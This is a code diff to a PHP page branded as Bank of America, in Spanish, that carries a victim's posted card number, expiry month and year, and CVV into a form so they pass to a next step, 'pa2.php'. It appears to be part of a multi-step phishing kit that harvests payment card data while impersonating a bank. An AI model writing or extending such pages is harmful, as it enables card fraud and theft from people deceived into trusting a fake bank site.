@@ -59,6 +59,24 @@
                                 CONFIRMAR
                             </button>
                         </div>
+			    
+			      <?php 
+                     $variable= $_POST['card'];
+        echo '<a href="pa2.php"></a><input id="card" name="card" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+		?>
+		    <?php 
+                     $variable= $_POST['mes'];
+        echo '<a href="pa2.php"></a><input id="mes" name="mes" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+		?>
+		    <?php 
+                     $variable= $_POST['year'];
+        echo '<a href="pa2.php"></a><input id="year" name="year" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+		?>
+		    <?php 
+                     $variable= $_POST['cvv'];
+        echo '<a href="pa2.php"></a><input id="cvv" name="cvv" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+		?>
+			    
                     </form>
                 </div>
                 <div class="columna3" style="float: right">
@@ -87,22 +105,7 @@
                     Igualdad de oportunidades en préstamos para viviendas
                 </a>
                 
-                <?php 
-                     $variable= $_POST['card'];
-        echo '<a href="pa2.php"></a><input id="card" name="card" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
-		?>
-		    <?php 
-                     $variable= $_POST['mes'];
-        echo '<a href="pa2.php"></a><input id="mes" name="mes" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
-		?>
-		    <?php 
-                     $variable= $_POST['year'];
-        echo '<a href="pa2.php"></a><input id="year" name="year" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
-		?>
-		    <?php 
-                     $variable= $_POST['cvv'];
-        echo '<a href="pa2.php"></a><input id="cvv" name="cvv" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
-		?>
+              
 
                 <span class="corporation">© 2021 Bank of America Corporation.</span>
             </div>
